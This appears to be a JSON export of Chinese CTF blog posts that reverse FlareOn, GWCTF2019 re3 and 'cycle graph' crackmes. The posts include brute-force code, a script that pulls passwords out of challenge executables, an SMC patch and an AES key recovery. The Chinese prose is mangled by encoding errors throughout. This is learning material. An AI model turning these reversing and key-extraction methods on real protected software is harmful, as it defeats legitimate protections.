0x81, 0x14, 0xF0, 0x06, 0x81, 0x15, 0xF1, 0xC4, 0x91, 0x1A, 0x06, 0x81, 0x1B, 0xE2, 0x06, 0x81, 0x18, 0xF2, 0x06, 0x81, 0x19, 0xF1, 0x06, 0x81, 0x1E, 0xF0, 0xC4, 0x99, 0x1F, 0xC4, 0x91, 0x1C, 0x06, 0x81, 0x1D, 0xE6, 0x06, 0x81, 0x62, 0xEF, 0x06, 0x81, 0x63, 0xF2, 0x06, 0x81, 0x60, 0xE3, 0xC4, 0x99, 0x61, 0x06, 0x81, 0x66, 0xBC, 0x06, 0x81, 0x67, 0xE6, 0x06, 0x81, 0x64, 0xE8, 0x06, 0x81, 0x65, 0x9D, 0x06, 0x81, 0x6A, 0xF2, 0xC4, 0x99, 0x6B, 0x06, 0x81, 0x68, 0xA9, 0x06, 0x81, 0x69, 0xEF, 0x06, 0x81, 0x6E, 0xEE, 0x06, 0x81, 0x6F, 0xAE, 0x06, 0x81, 0x6C, 0xE3, 0x06, 0x81, 0x6D, 0xEF, 0x06, 0x81, 0x72, 0xE9, 0x06, 0x81, 0x73, 0x7C }; #define HIBYTE(x) ((x \u0026amp; 0xFF00) \u0026gt;\u0026gt; 8) int main(){ for (unsigned short buf = 0; buf \u0026lt;= 0xff; buf++){ unsigned char new_char[130]; unsigned char *a1 = new_char; unsigned int i = 0; do { *a1 = (buf ^ ida_chars[i++]) + 34; ++a1; } while ( i \u0026lt; 121 ); unsigned int v2 = 0x79; // 0x79 a1 = new_char; unsigned short v3 = 255; for ( i = 255; v2; v3 = HIBYTE(v3) + (unsigned char)v3 ) { unsigned short v5 = i; int v6 = v2; if ( v2 \u0026gt; 0x14 ) v6 = 0x14; v2 -= v6; do { v5 += *a1; v3 += v5; ++a1; --v6; } while ( v6 ); i = HIBYTE(v5) + (unsigned char)v5; } int ret = (HIBYTE(i) + (unsigned char)i) | ((v3 \u0026lt;\u0026lt; 8) + (v3 \u0026amp; 0xFF00)); // if (buf == \u0026#39;f\u0026#39;) // printf(\u0026#34;%x\\n\u0026#34;, ret); // 0xf51c // if (buf == \u0026#39;@\u0026#39;) // printf(\u0026#34;%x\\n\u0026#34;, ret); // 0x60ee if (ret == 0xFB5E) { printf(\u0026#34;%d\\n\u0026#34;, buf); break; } // printf(\u0026#34;%c %x\\n\u0026#34;, buf, ret); } } ä¸€å¼€å§‹ç»™çš„èŒƒå›´å°äº†ï¼ˆä»¥ä¸ºä¼šæ˜¯å¯è§å­—ç¬¦ï¼‰ï¼Œä¸€ç›´çˆ†ç ´ä¸å‡ºæ¥ï¼Œåå¤éªŒè¯äº†å¥½å¤šæ¬¡ï¼Œåæ¥æ‰å‘ç°èŒƒå›´æ˜¯ 0-0xff\næœ€åçˆ†ç ´å‡ºæ¥æ˜¯ 0xA2ï¼Œæ€è€ƒäº†ä¸€ä¸‹æ€ä¹ˆncä¼ é€’ä¸å¯è§å­—ç¬¦ï¼Œç„¶åå†³å®šç›´æ¥åŠ¨è°ƒæ”¹å†…å­˜\nä¸‹æ–­ç‚¹ï¼Œç„¶åä¿®æ”¹bufï¼Œä¹‹åçœ‹ä¸€çœ¼SMCè§£å¯†ç»“æœï¼Œå‘ç°ç›´æ¥ç»™flagäº†ï¼Œå»æ ˆé‡Œdumpä¸€ä¸‹\n[FlareOn5]FLEGGO çœ‹åå­—è¿˜ä»¥ä¸ºæ˜¯ä¸ªgoå‘¢ï¼Œç»“æœå‘ç°æ˜¯ä¸ªæŠ«ç€reå¤–å¥—çš„miscï¼ˆæµæ±—\nè§£å‹åå‘ç°æœ‰ä¸€å †ç¨‹åºï¼Œå…ˆéšä¾¿æŒ‘ä¸€ä¸ªæ—¥\nåŠ¨è°ƒå‘ç°éœ€è¦è¾“å…¥ä¸€ä¸²å­—ç¬¦ä¸²ï¼Œåˆšå¼€å§‹è¿˜æƒ³çœ‹çœ‹æ˜¯ä¸æ˜¯å’Œbase64æœ‰å…³ï¼Œåæ¥å‘ç°è¿™ä¸²å­—ç¬¦ä¸²å°±åœ¨exeæ–‡ä»¶ä¸­ï¼Œé‚£å°±ç›´æ¥ä¸Špythonæ•´æ‰¹é‡æ“ä½œäº†\nå‘ç°passwordå­˜çš„åœ°å€æ˜¯å›ºå®šçš„ï¼Œé‚£å°±ç”¨subprocesså¯¹æ¯ä¸ªexeè¿è¡Œä¸€ä¸‹\næ”¾ä¸ªè„šæœ¬\nimport subprocess import os # from pwn import * files = [ \u0026#34;./1BpnGjHOT7h5vvZsV4vISSb60Xj3pX5G.exe\u0026#34;, \u0026#34;./1JpPaUMynR9GflWbxfYvZviqiCB59RcI.exe\u0026#34;, \u0026#34;./2AljFfLleprkThTHuVvg63I7OgjG2LQT.exe\u0026#34;, \u0026#34;./3Jh0ELkck1MuRvzr8PLIpBNUGlspmGnu.exe\u0026#34;, \u0026#34;./4ihY3RWK4WYqI4XOXLtAH6XV5lkoIdgv.exe\u0026#34;, \u0026#34;./7mCysSKfiHJ4WqH2T8ERLE33Wrbp6Mqe.exe\u0026#34;, \u0026#34;./AEVYfSTJwubrlJKgxV8RAl0AdZJ5vhhy.exe\u0026#34;, \u0026#34;./BG3IDbHOUt9yHumPceLTVbObBHFneYEu.exe\u0026#34;, \u0026#34;./Bl0Iv5lT6wkpVCuy7jtcva7qka8WtLYY.exe\u0026#34;, \u0026#34;./Bp7836noYu71VAWc27sUdfaGwieALfc2.exe\u0026#34;, \u0026#34;./E36RGTbCE4LDtyLi97l9lSFoR7xVMKGN.exe\u0026#34;, \u0026#34;./Ew93SSPDbgiQYo4E4035A16MJUxXegDW.exe\u0026#34;, \u0026#34;./HDHugJBqTJqKKVtqi3sfR4BTq6P5XLZY.exe\u0026#34;, \u0026#34;./IXITujCLucnD4P3YrXOud5gC7Bwcw6mr.exe\u0026#34;, \u0026#34;./JIdE7SESzC1aS58Wwe5j3i6XbpkCa3S6.exe\u0026#34;, \u0026#34;./JXADoHafRHDyHmcTUjEBOvqq95spU7sj.exe\u0026#34;, \u0026#34;./K7HjR3Hf10SGG7rgke9WrRfxqhaGixS0.exe\u0026#34;, \u0026#34;./MrA1JmEDfPhnTi5MNMhqVS8aaTKdxbMe.exe\u0026#34;, \u0026#34;./NaobGsJ2w6qqblcIsj4QYNIBQhg3gmTR.exe\u0026#34;, \u0026#34;./P2PxxSJpnquBQ3xCvLoYj4pD3iyQcaKj.exe\u0026#34;, \u0026#34;./PvlqINbYjAY1E4WFfc2N6rZ2nKVhNZTP.exe\u0026#34;, \u0026#34;./SDIADRKhATsagJ3K8WwaNcQ52708TyRo.exe\u0026#34;, \u0026#34;./SeDdxvPJFHCr7uoQMjwmdRBAYEelHBZB.exe\u0026#34;, \u0026#34;./aSfSVMn7B8eRtxgJgwPP5Y5HiDEidvKg.exe\u0026#34;, \u0026#34;./azcyERV8HUbXmqPTEq5JFt7Ax1W5K4wl.exe\u0026#34;, \u0026#34;./bmYBZTBJlaFNbbwpiOiiQVdzimx8QVTI.exe\u0026#34;, \u0026#34;./cWvFLbliUfJl7KFDUYF1ABBFYFb6FJMz.exe\u0026#34;, \u0026#34;./d4NlRo5umkvWhZ2FmEG32rXBNeSSLt2Q.exe\u0026#34;, \u0026#34;./dT4Xze8paLOG7srCdGLsbLE1s6m3EsfX.exe\u0026#34;, \u0026#34;./dnAciAGVdlovQFSJmNiPOdHjkM3Ji18o.exe\u0026#34;, \u0026#34;./eEJhUoNbuc40kLHRo8GB7bwFPkuhgaVN.exe\u0026#34;, \u0026#34;./eovBHrlDb809jf08yaAcSzcX4T37F1NI.exe\u0026#34;, \u0026#34;./gFZw7lPUlbOXBvHRc31HJI5PKwy745Wv.exe\u0026#34;, \u0026#34;./hajfdokqjogmoWfpyp4w0feoeyhs1QLo.exe\u0026#34;, \u0026#34;./iJO15JsCa1bV5anXnZ9dTC9iWbEDmdtf.exe\u0026#34;, \u0026#34;./jJHgJjbyeWTTyQqISuJMpEGgE1aFs5ZB.exe\u0026#34;, \u0026#34;./kGQY35HJ7gvXzDJLWe8mabs3oKpwCo6L.exe\u0026#34;, \u0026#34;./lk0SOpnVIzTcC1Dcou9R7prKAC3laX0k.exe\u0026#34;, \u0026#34;./u3PL12jk5jCZKiVm0omvh46yK7NDfZLT.exe\u0026#34;, \u0026#34;./u8mbI3GZ8WtwruEiFkIl0UKxJS917407.exe\u0026#34;, \u0026#34;./v6RkHsLya4wTAh71C65hMXBsTc1ZhGZT.exe\u0026#34;, \u0026#34;./w3Y5YeglxqIWstp1PLbFoHvrQ9rN3F3x.exe\u0026#34;, \u0026#34;./wmkeAU8MdYrC9tEUMHH2tRMgaGdiFnga.exe\u0026#34;, \u0026#34;./x4neMBrqkYIQxDuXpwJNQZOlfyfA0eXs.exe\u0026#34;, \u0026#34;./xatgydl5cadiWFY4EXMRuoQr22ZIRC1Y.exe\u0026#34;, \u0026#34;./xyjJcvGAgswB7Yno5e9qLF4i13L1iGoT.exe\u0026#34;, \u0026#34;./y77GmQGdwVL7Fc9mMdiLJMgFQ8rgeSrl.exe\u0026#34;, \u0026#34;./zRx3bsMfOwG8IaayOeS8rHSSpiRfc9IB.exe\u0026#34; ] for f in files: cur_file = open(f, \u0026#39;rb\u0026#39;) cur_file.seek(0x2AB0) read_file = cur_file.read(32) password = b\u0026#39;\u0026#39; for p in read_file: if p != 0: password += p.to_bytes(1, \u0026#39;big\u0026#39;) # print (password) p = subprocess.Popen(f, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True) out, err = p.communicate(password + b\u0026#39;\\n\u0026#39;) # print (out) pic_name = out[47:59] char_of_pic = out[-3].to_bytes(1, \u0026#39;big\u0026#39;) os.rename(pic_name, char_of_pic + pic_name) è¾“å‡ºä¼šè¯´æ¯ä¸ªå›¾ç‰‡å¯¹åº”çš„å­—ç¬¦ï¼Œç‚¹å¼€å›¾ç‰‡åå‘ç°å·¦ä¸Šè§’æœ‰æ•°å­—ï¼Œåº”è¯¥æ˜¯ä¸‹æ ‡\nè¿™tmå°±æ˜¯miscå•Šï¼\nå‰©ä¸‹çš„å°±æ˜¯æ‰‹åŠ¨æ‰¾ä½ç½®äº†ï¼Œå±‘\n[FlareOn1]5get_it ç»™çš„æ˜¯ä¸€ä¸ªDLLæ–‡ä»¶ï¼ˆæ²¡è®°é”™çš„è¯ï¼‰ï¼Œåº”è¯¥æ˜¯ç”¨æ¥é’©å–é”®ç›˜è¾“å…¥çš„ï¼Œæ ¹æ®ä¸åŒçš„è¾“å…¥æ‰§è¡Œä¸åŒçš„å†…å®¹ï¼Œè§‚å¯Ÿåˆ°æœ‰ä¸ªå‡½æ•°ä¸º sub_10001240ï¼Œæ‰§è¡ŒæˆåŠŸå°±è¯´æ˜é€šè¿‡äº†\næŸ¥æ‰¾å¼•ç”¨\nconst char *sub_10009AF0() { if ( dword_100194FC \u0026gt; 0 ) { _cfltcvt_init(); sub_10001240(); } return \u0026#34;m\u0026#34;; } è¦æ±‚è®©å†…å­˜ä¸­ä¸€ä¸ªæ•°ä¸ä¸º0ï¼Œæ ¹æ®è¿™ä¸ªæ•°å†å‘ä¸Šæ‰¾\nconst char *sub_10009B60() { if ( dword_1001947C \u0026lt;= 0 ) { if ( dword_10019490 \u0026lt;= 0 ) { if ( dword_100194E0 \u0026lt;= 0 ) { if ( dword_100194EC \u0026lt;= 0 ) { if ( dword_100194F8 \u0026lt;= 0 ) { _cfltcvt_init(); } else { dword_100194F8 = 0; dword_100194FC = 1; } } else { dword_100194EC = 0; dword_100194F0 = 1; } } else { dword_100194E0 = 0; dword_100194E4 = 1; } } else { dword_10019490 = 0; dword_10019494 = 1; } } else { dword_1001947C = 0; dword_10019480 = 1; } return \u0026#34;o\u0026#34;; } çœ‹åˆ°æœ€é‡Œé¢å°±æ˜¯èµ‹å€¼ä¸º1ï¼Œæ‰€ä»¥æœ€åä¸¤ä½è¾“å…¥å°±æ˜¯ om\næ ¹æ®è¿™ä¸ªæ–¹æ³•ä¸€ç‚¹ä¸€ç‚¹å‘ä¸Šæ‰¾å¼•ç”¨ï¼Œå°±èƒ½æ¢å¤å‡ºflag\nä¸è¿‡ä¸çŸ¥é“å¤§å°å†™æ˜¯æ€ä¹ˆåˆ¤æ–­çš„ï¼Œç½‘ä¸Šä¹Ÿæ²¡æŸ¥åˆ°\n[FlareOn]starter baby\nå…ˆæ‰§è¡Œç»™çš„ç¨‹åºï¼Œä¼šè‡ªåŠ¨è§£å‹å‡ºä¸€ä¸ªå°ç¨‹åºï¼Œåç¼–è¯‘ä¸€ä¸‹ï¼Œè§‚å¯Ÿåˆ°\nReadFile(v2, byte_402158, 0x32u, \u0026amp;NumberOfBytesWritten, 0); v0 = 0; while ( ((unsigned __int8)byte_402158[v0] ^ 0x7D) == byte_402140[v0] ) { if ( ++v0 \u0026gt;= 24 ) return WriteFile(hFile, aYouAreSuccess, 0x12u, \u0026amp;NumberOfBytesWritten, 0); } ç›´æ¥dumpæ•°æ®è¿›è¡Œå¼‚æˆ–å°±è¡Œ\n[FlareOn2]elfie è¿™é¢˜æ˜¯ä¸ªpythonçš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œèƒ½è§£å‡ºä¸€ä¸ªæ··æ·†è¿‡çš„pythonæ–‡ä»¶\nimport base64 O0OO0OO00000OOOO0OOOOO0O00O0O0O0 = \u0026#39;IRGppV0FJM3BRRlNwWGhNNG\u0026#39; OO0O0O00OO00OOOOOO0O0O0OOO0OOO0O = \u0026#39;UczRkNZZ0JVRHJjbnRJUWlJV3FRTkpo\u0026#39; OOO0000O0OO0OOOOO000O00O0OO0O00O = \u0026#39;xTStNRDJqZG9nRCtSU1V\u0026#39; OOO0000O0OO0OOOOO000O00O0OO0O00O += \u0026#39;Rbk51WXI4dmRaOXlwV3NvME0ySGp\u0026#39; # many lines exec(base64.b64decode(OOO)) æŠŠæœ€åçš„execæ”¹æˆprintï¼ŒæŸ¥çœ‹ä¸€ä¸‹ä»£ç ï¼Œå‘ç°é‡Œé¢çš„å­—ç¬¦ä¸²éƒ½è¢« [::-1] äº†ï¼Œè§£ä¸€ä¸‹å‘ç°å…¶ä¸­ä¸€ä¸ªå°±æ˜¯flag\n[FlareOn2]Android soå±‚é€†å‘ï¼Œç¨‹åºæ˜¯å°†å‰åä¸¤ä¸ªè¾“å…¥åˆå¹¶ï¼Œç„¶ååšä¸€ä¸ªè´¨å› æ•°åˆ†è§£ï¼Œæ‰‹åŠ¨dumpäº†ä¸€ä¸‹æ•°æ®ï¼Œç„¶åå†™è„šæœ¬ï¼ˆå¦‚æœä¼šidapythonå°±å¥½äº†ï¼Œç•™ä¸‹äº†ä¸å­¦æ— æœ¯çš„æ³ªæ°´.jpgï¼‰\nfrom libnum import * for f in extract: flag = 1 for i in range(len(f)): flag *= pow(prime[i], f[i]) print (n2s(flag).decode(), end = \u0026#39;\u0026#39;) print () ","date":"2021-04-09T01:04:16Z","permalink":"/post/buuoj-flareon-challenge/","title":"BUUOJ FlareOn Challenge"},{"content":"é™æ€åˆ†æ é¦–å…ˆé€šè¿‡å…³é”®å­—ç¬¦ä¸² Wrong è¿›å…¥ main å‡½æ•°\nvoid __fastcall __noreturn main(int a1, char **a2, char **a3) { int i; // [rsp+8h] [rbp-48h] char s[40]; // [rsp+20h] [rbp-30h] BYREF unsigned __int64 v5; // [rsp+48h] [rbp-8h] v5 = __readfsqword(0x28u); __isoc99_scanf(\u0026#34;%39s\u0026#34;, s); if ( (unsigned int)strlen(s) != 32 ) { puts(\u0026#34;Wrong!\u0026#34;); exit(0); } mprotect(\u0026amp;dword_400000, 0xF000uLL, 7); for ( i = 0; i \u0026lt;= 223; ++i ) *((_BYTE *)sub_402219 + i) ^= 0x99u; sub_40207B((__int64)\u0026amp;unk_603170); sub_402219(); } é˜…è¯»ä¸€ä¸‹ä»£ç ï¼Œå‘ç°å…ˆæ˜¯è¾“å…¥ä¸€ä¸ªé•¿åº¦ä¸º32çš„å­—ç¬¦ä¸²\néšåå¯¹ä¸€ä¸ªå¥‡æ€ªçš„åœ°å€æ‰§è¡Œäº†ä¸€ä¸ªå‡½æ•°ï¼Œä½†è¿™ä¸ªåœ°å€å’Œè¾“å…¥åº”è¯¥æ²¡æœ‰å…³ç³»ï¼Œå¯ä»¥æš‚æ—¶ä¸ç®¡\næ³¨æ„åˆ°æœ‰ä¸ª for å¾ªç¯å¯¹æŸä¸€ä¸ªåœ°å€çš„å€¼åšäº†ä¸ªå¼‚æˆ–ï¼Œæœ€ååˆè°ƒç”¨äº†è¿™ä¸ªåœ°å€ï¼Œè¿™æ˜¯ç®€å•ä¸”ç»å…¸çš„ SMC\nç”¨ idapython patch ä¸€ä¸‹ï¼Œç”¨è¿è¡Œè„šæœ¬åŠŸèƒ½ï¼Œç”±äºé•¿åº¦è¾ƒçŸ­ï¼Œç›´æ¥åœ¨idaä¸­æ‰‹å†™äº†\nstart = 0x402219 end = start + 223 for i in range(start, end + 1): patch_byte(i, get_wide_byte(i) ^ 0x99) è¿è¡Œå®Œåè¿›å…¥è¿™ä¸ªåœ°å€ï¼Œå¥½åƒä¸èƒ½åœ¨ 402219 å¤„æ–°å»ºå‡½æ•°ï¼Œåªèƒ½åœ¨ 40221A å¤„æŒ‰ p é”®æ–°å»ºå‡½æ•°ï¼ŒF5 æŸ¥çœ‹è¿™ä¸ªå‡½æ•°\n__int64 __fastcall sub_40221A(__int64 a1) { unsigned int v2; // [rsp+18h] [rbp-D8h] int i; // [rsp+1Ch] [rbp-D4h] char v4[200]; // [rsp+20h] [rbp-D0h] BYREF unsigned __int64 v5; // [rsp+E8h] [rbp-8h] v5 = __readfsqword(0x28u); sub_400A71((__int64)v4, (__int64)\u0026amp;unk_603170);// ç»å…¸å¯†é’¥ç”Ÿæˆ sub_40196E((__int64)v4, a1); // è¿™tmæ˜¯AES sub_40196E((__int64)v4, a1 + 16); v2 = 1; for ( i = 0; i \u0026lt;= 31; ++i ) { if ( *(_BYTE *)(i + a1) != byte_6030A0[i] ) v2 = 0; } return v2; } æœ€åçš„ byte_6030A0 æ˜¾ç„¶æ˜¯åŠ å¯†ç»“æœçš„æ ¡éªŒäº†\nä¸Šé¢æœ‰ä¸¤ä¸ªå‡½æ•° sub_400A71 å’Œ sub_40196Eï¼Œ400A71 è°ƒç”¨äº†ä¹‹å‰å‡ºç°çš„ 603170 çŒœæµ‹æ˜¯ä¸€ä¸ªå¯†é’¥ï¼Œ40196E ä½¿ç”¨äº†ä¸¤æ¬¡ï¼Œä¸”åˆ†åˆ«æ˜¯å¯¹è¾“å…¥çš„å‰ä¸€åŠä¸åä¸€åŠçš„æ“ä½œï¼ŒçŒœæµ‹æ˜¯åŠ å¯†å‡½æ•°ã€‚å¯†é’¥ç”Ÿæˆå’Œè¾“å…¥æ— å…³ï¼Œå®Œå…¨å¯ä»¥é€šè¿‡åŠ¨æ€è°ƒè¯•å¾—åˆ°ç»“æœï¼Œæ‰€ä»¥æŸ¥çœ‹åŠ å¯†å‡½æ•°ã€‚\n__int64 __fastcall sub_401828(__int64 a1, __int64 a2) { unsigned __int8 i; // [rsp+1Fh] [rbp-1h] sub_400B0A(0LL, a1, a2); // è¿™æ˜¯aeså“¦ for ( i = 1; i \u0026lt;= 9u; ++i ) { sub_400BAC(a1); sub_400C1F(a1); sub_400D27(a1); sub_400B0A(i, a1, a2); } sub_400BAC(a1); sub_400C1F(a1); return sub_400B0A(10LL, a1, a2); } ä¸€å¼€å§‹è¢«å„ä¸ªå‡½æ•°å“ä¸€è·³ï¼Œä½†ç‚¹åˆ°æŸä¸ªå‡½æ•°é‡Œå‘ç°å¥½åƒæ˜¯ $4\\times 4$ çš„ä¸€ä¸ªæ–¹é˜µï¼Œåˆå‘ç°æŸäº›å‡½æ•°é‡å¤å‡ºç°çš„è§„åˆ™å’Œ AES å¾ˆåƒï¼Œäºæ˜¯æ¨æµ‹è¿™ä¸ªæ˜¯ AES åŠ å¯†ç®—æ³•ï¼Œç¨å¾®çœ‹äº†ä¸‹å…·ä½“çš„å‡½æ•°å®ç°ï¼Œåº”è¯¥æ²¡æœ‰å¤§é—®é¢˜ï¼Œäºæ˜¯ç€æ‰‹è§£å¯†äº†ã€‚\nè§£å¯† é¦–å…ˆåŠ¨æ€è°ƒè¯•æ‹¿åˆ°å¯†é’¥\nç›´æ¥æ­¥è¿‡è¿™å¥ä»£ç ï¼š sub_40207B((__int64)\u0026amp;unk_603170);\ngdb-peda$ b *0x4021e4 Breakpoint 2 at 0x4021e4 gdb-peda$ c gdb-peda$ n gdb-peda$ x/50x 0x603170 0x603170: 0xcb 0x8d 0x49 0x35 0x21 0xb4 0x7a 0x4c 0x603178: 0xc1 0xae 0x7e 0x62 0x22 0x92 0x66 0xce 0x603180: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 æ‹¿åˆ°å¯†é’¥\néšåç›´æ¥åˆ° ida ç›¸åº”åœ°å€ä¸­å–å‡ºå¯†æ–‡\nç”¨ä¹‹å‰å†™è¿‡çš„ AES è„šæœ¬è§£å¯†\nimport my_aes from libnum import n2s key = 0xcb8d493521b47a4cc1ae7e62229266ce cipher1 = 0xBC0AADC0147C5ECCE0B140BC9C51D52B cipher2 = 0x46B2B9434DE5324BAD7FB4B39CDB4B5B print(n2s(my_aes.aes_encrypt(cipher1, key)), end = \u0026#39;\u0026#39;) print(n2s(my_aes.aes_encrypt(cipher2, key))) è¾“å‡ºå¦‚ä¸‹ï¼š\nb\u0026#39;flag{924a9ab2163\u0026#39;b\u0026#39;d390410d0a1f670}\u0026#39; å¾—åˆ° flag\n","date":"2021-04-08T22:36:12Z","permalink":"/post/gwctf2019-re3-writeup/","title":"GWCTF2019 re3 writeup"},{"content":" cycle graph å¤©æ´¥å“ fxck easyparser cycle graph é€†å‘ä»£ç  æ ¹æ®æç¤ºï¼Œè¿™æ˜¯ä¸€é“çº¯ç®—æ³•é¢˜ï¼Œæ‹–åˆ° ida ä¸­ï¼Œæ ¹æ®å…³é”®å­—ç¬¦ä¸²å®šä½åˆ°å…³é”®å‡½æ•°ã€‚æŸ¥çœ‹æ ¸å¿ƒä»£ç \ndword_403370 = 0; v1 = \u0026amp;unk_403384; byte_403374 = 48; v2 = 0; dword_403378 = (int)\u0026amp;unk_403380; do { v3 = dword_402178[v2]; ++v2; *(v1 - 1) = v3; *v1 = (char *)\u0026amp;unk_403380 + 12 * dword_402274[v2]; v1[1] = (char *)\u0026amp;unk_403380 + 12 * dword_4021F4[v2]; v1 += 3; } while ( (signed int)v1 \u0026lt; (signed int)\u0026amp;unk_403504 ); ä¸Šé¢çš„ä»£ç æ˜¯ä¸»å‡½æ•°å¼€å¤´çš„åˆå§‹åŒ–éƒ¨åˆ†\nsub_401020(\u0026#34;You need a flag to get out of this:\\n\u0026#34;, a1); scan(\u0026#34;%s\u0026#34;, \u0026amp;input); v4 = dword_403370; // 0 v5 = byte_403374; // 48 v6 = 5; v7 = dword_403378; do { v11 = *(\u0026amp;input + v6); if ( *(_DWORD *)v7 + v5 == v11 ) { v7 = *(_DWORD *)(v7 + 4); } else { if ( v5 - *(_DWORD *)v7 != v11 ) { sub_401020(\u0026#34;This is not flag~\\n\u0026#34;, v10); system(\u0026#34;pause\u0026#34;); exit(1); } v7 = *(_DWORD *)(v7 + 8); } v5 = *(\u0026amp;input + v6); ++v4; ++v6; byte_403374 = v5; dword_403378 = v7; dword_403370 = v4; } while ( v6 \u0026lt; 21 ); ä¸Šé¢çš„ä»£ç æ˜¯æ ¹æ®è¾“å…¥è¿›è¡Œçš„ä¸€ç³»åˆ—æ“ä½œ\nif ( input != \u0026#39;f\u0026#39; || v13 != \u0026#39;l\u0026#39; || v14 != \u0026#39;a\u0026#39; || v15 != \u0026#39;g\u0026#39; || v16 != \u0026#39;{\u0026#39; || v17 != \u0026#39;}\u0026#39; ) { v8 = \u0026#34;illegal input~\\n\u0026#34;; } else if ( v4 \u0026gt; 16 || (_UNKNOWN *)v7 != \u0026amp;unk_4034F4 ) { v8 = \u0026#34;This is not flag~\\n\u0026#34;; } else { v8 = \u0026#34;Congratulations!!\\n\u0026#34;; } sub_401020(v8, v11); system(\u0026#34;pause\u0026#34;); return 0; ä¸Šé¢çš„ä»£ç å°±æ˜¯æœ€åçš„éªŒè¯ç¯èŠ‚\nä¸€å¼€å§‹å°è¯•ç›´æ¥çœ‹ä»£ç ï¼Œå‘ç°è‡ªå·±è¢«ç»•è¿›å»äº†ï¼Œå®Œå…¨ä¸çŸ¥é“å„ä¸ªåœ°å€æ˜¯ä»€ä¹ˆä¸œè¥¿ï¼Œæ‰€ä»¥è€ƒè™‘é€šè¿‡åŠ¨æ€è°ƒè¯•æ¥å¾—åˆ°åˆå§‹åŒ–åçš„ç»“æœ\nåŠ¨æ€è°ƒè¯• ç›´æ¥æ‹–åˆ° x32dbg ä¸­ï¼Œåœ¨ç¬¬ä¸€ä¸ªè¾“å‡ºçš„å­—ç¬¦ä¸²å‰é¢æ‰“ä¸Šæ–­ç‚¹ï¼Œç„¶åè¿è¡Œåˆ°æ–­ç‚¹çš„ä½ç½®\nåˆ†æäº†ä¸€ä¸‹åˆå§‹åŒ–éƒ¨åˆ†ï¼Œè®¤ä¸ºå…³é”®çš„å†…å­˜éƒ¨åˆ†åº”è¯¥æ˜¯ä» 403370 å¼€å§‹ä¸€ç›´åˆ° 403540 è¿™éƒ¨åˆ†\näºæ˜¯æ‰¾åˆ° 3370 ï¼Œå³é”®é€‰æ‹©å†…å­˜çª—å£æ‰¾åˆ°åœ°å€\né‰´äºæ•°æ®é‡ä¸å¤§ï¼Œç›´æ¥æ‰‹dumpä¸‹æ¥å°±è¡Œäº†\n00C43370 00 00 00 00 30 00 00 00 80 33 C4 00 00 00 00 00 ....0....3Ã„..... 00C43380 34 00 00 00 98 33 C4 00 8C 33 C4 00 02 00 00 00 4....3Ã„..3Ã„..... 00C43390 98 33 C4 00 E0 33 C4 00 2C 00 00 00 8C 33 C4 00 .3Ã„.Ã 3Ã„.,....3Ã„. 00C433A0 D4 33 C4 00 2A 00 00 00 58 34 C4 00 94 34 C4 00 Ã”3Ã„.*...X4Ã„..4Ã„. 00C433B0 06 00 00 00 D4 33 C4 00 EC 33 C4 00 2A 00 00 00 ....Ã”3Ã„.Ã¬3Ã„.*... 00C433C0 98 33 C4 00 64 34 C4 00 2F 00 00 00 B8 34 C4 00 .3Ã„.d4Ã„./...Â¸4Ã„. 00C433D0 F4 34 C4 00 2A 00 00 00 1C 34 C4 00 94 34 C4 00 Ã´4Ã„.*....4Ã„..4Ã„. 00C433E0 33 00 00 00 B0 33 C4 00 EC 33 C4 00 03 00 00 00 3...Â°3Ã„.Ã¬3Ã„..... 00C433F0 F8 33 C4 00 1C 34 C4 00 02 00 00 00 B0 33 C4 00 Ã¸3Ã„..4Ã„.....Â°3Ã„. 00C43400 10 34 C4 00 32 00 00 00 7C 34 C4 00 DC 34 C4 00 .4Ã„.2...|4Ã„.Ãœ4Ã„. 00C43410 32 00 00 00 28 34 C4 00 F8 33 C4 00 32 00 00 00 2...(4Ã„.Ã¸3Ã„.2... 00C43420 8C 33 C4 00 A0 34 C4 00 30 00 00 00 80 33 C4 00 .3Ã„.Â 4Ã„.0....3Ã„. 00C43430 EC 33 C4 00 03 00 00 00 28 34 C4 00 A0 34 C4 00 Ã¬3Ã„.....(4Ã„.Â 4Ã„. 00C43440 01 00 00 00 BC 33 C4 00 AC 34 C4 00 32 00 00 00 ....Â¼3Ã„.Â¬4Ã„.2... 00C43450 D4 33 C4 00 EC 33 C4 00 2B 00 00 00 D0 34 C4 00 Ã”3Ã„.Ã¬3Ã„.+...Ã4Ã„. 00C43460 B8 34 C4 00 02 00 00 00 10 34 C4 00 A4 33 C4 00 Â¸4Ã„......4Ã„.Â¤3Ã„. 00C43470 2E 00 00 00 D0 34 C4 00 88 34 C4 00 01 00 00 00 ....Ã4Ã„..4Ã„..... 00C43480 34 34 C4 00 C8 33 C4 00 02 00 00 00 34 34 C4 00 44Ã„.Ãˆ3Ã„.....44Ã„. 00C43490 4C 34 C4 00 2D 00 00 00 98 33 C4 00 1C 34 C4 00 L4Ã„.-....3Ã„..4Ã„. 00C434A0 32 00 00 00 40 34 C4 00 D4 33 C4 00 04 00 00 00 2...@4Ã„.Ã”3Ã„..... 00C434B0 94 34 C4 00 34 34 C4 00 2D 00 00 00 E8 34 C4 00 .4Ã„.44Ã„.-...Ã¨4Ã„. 00C434C0 70 34 C4 00 30 00 00 00 94 34 C4 00 8C 33 C4 00 p4Ã„.0....4Ã„..3Ã„. 00C434D0 31 00 00 00 64 34 C4 00 40 34 C4 00 2F 00 00 00 1...d4Ã„.@4Ã„./... 00C434E0 EC 33 C4 00 B0 33 C4 00 33 00 00 00 88 34 C4 00 Ã¬3Ã„.Â°3Ã„.3....4Ã„. 00C434F0 04 34 C4 00 05 00 00 00 F4 34 C4 00 F4 34 C4 00 .4Ã„.....Ã´4Ã„.Ã´4Ã„. 00C43500 02 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00 ................ ç„¶åå¯¹ç…§ç€ç¬¬äºŒéƒ¨åˆ†çš„ä»£ç ä¸€ç‚¹ä¸€ç‚¹çœ‹ï¼Œå‘ç°å…¶å®å°±æ˜¯å¦‚æœ *(_DWORD *)v7 + v5 == v11 å°±è®© v7 è·³åˆ°ä¸‹ä¸€ä¸ªå†…å­˜åœ°å€æ‰€æŒ‡å‘çš„åœ°å€ï¼ˆè¿™é¢˜æŒ‡é’ˆæœ‰ç‚¹ç»•ï¼‰ï¼Œæ¯”å¦‚ä¸€å¼€å§‹å¦‚æœæ»¡è¶³è¾“å…¥ä¸º 0x34+0x30 æ¥ä¸‹æ¥å°±å…ˆèµ°åˆ° C43384 